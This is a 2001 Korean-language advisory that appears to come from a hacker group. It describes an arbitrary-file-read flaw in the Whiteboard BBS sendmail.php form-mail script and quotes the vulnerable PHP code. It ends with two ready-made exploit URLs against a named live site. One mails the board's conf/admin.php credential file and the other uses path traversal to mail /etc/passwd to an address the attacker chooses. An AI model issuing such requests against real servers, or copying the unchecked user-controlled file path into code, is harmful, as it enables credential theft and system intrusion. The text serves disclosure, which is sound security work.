====================================================================

Subject : Admin ID/password N server files 
	 intercept in the sendmail.php vulnerable
Date : 2001. 11. 27.
Author : 1ndr4
Return.. ;-) : <indra@gnuhacker.com> 

==================================================================== 

Tested version : Whiteboard all Version

sendmail.php 의 formmail 과 관련한 취약점이다.
이는 다음과 같다.

== sendmail.php 의 source code ==

....

if($mode=='mailsend')
{
        if(!$to) message ("받으실분의 메일계정을 입력하세요");
        if(!$subject) message ("제목을 입력하세요");
        if(!$body) message ("내용을 입력하세요");

       $mailheaders .= "Return-Path: $from\r\n";
       $mailheaders .= "From: $rn <$from>\r\n";
       $mailheaders .= "X-Mailer: Gfew Interface\r\n";

       if ($userfile && $userfile_size) {

          $filename=basename($userfile_name);
          $result=fopen($userfile,"r");
          $file=fread($result,$userfile_size);
          fclose($result);

....

위의 source code 는 mail 보내는 각 변수지정으로 

$to = mail 을 받을 주소
$subject = 제목
$body = 내용

의 형식으로 되어 있다.
그러나 if 문을 사용하여 $userfile = 첨부파일
이 있을 경우 각 size 와 filename 을 정하여 
r (read) mode 로 읽고 fopen() 로 저장하게 된다.
그러나 이때 외부의 악의를 가진 이가 file 의 내용을 임의로 정하게 할수가 있다.

Exploiting..

1) http://localhost/bbs -- bbs 가 설치된 경로
2) sendmail.php?mode=mailsend -- sendmail 의 mailsend mode 를 지정
3) &to=[mail을 받을 주소] -- mail 을 받을 주소를 지정
4) &from=[보내는 사람의 mail 주소] -- 메일주소가 아닌 문자열 지정도 가능
5) &subject=[제목] -- 제목이 들어갈곳 지정
6) &userfile=[첨부파일] -- 대개 첨부파일의 이름
7) &userfile_size=[첨부파일의 size] -- 파일의 size 지정
8) &userfile_name=[보내어질 파일의 이름] -- 첨부파일의 이름을 지정
9) &body=[mail messages] -- 전체적인 messages 의 내용 지정

http://1+2+3+4+5+6+7+8+9 = file intercept bug.. ;-)

문제가 되는 부분은 악의를 가진 사용자가 임의의 파일을 지정할수 있다는 것이며
또한 filesize 가 맞지 않아도 임의의 사용자가 filesize 의 값을 해당 파일보다
크게 잡아버리면 error 인식을 하지 못한다.

< Exploit >

http://whitebbs.net/whitestylist/sendmail.php?mode=mailsend&to=[Write on your E-mail address.. ;-)]&from=indra@gnuhacker.com&subject=Intercept_Test_1&userfile=conf/admin.php&userfile_size=1000&userfile_name=admin.php.txt&body=FormmailBug1

http://whitebbs.net/whitestylist/sendmail.php?mode=mailsend&to=[Write on your E-mail address.. ;-)]&from=indra@gnuhacker.com&subject=Intercept_Test_2&userfile=../../../../etc/passwd&userfile_size=100000&userfile_name=passwd.txt&body=FormmailBug2

other formmail source has this bug too...?
testing..

THX to mAzE... ;-)
--EOF--
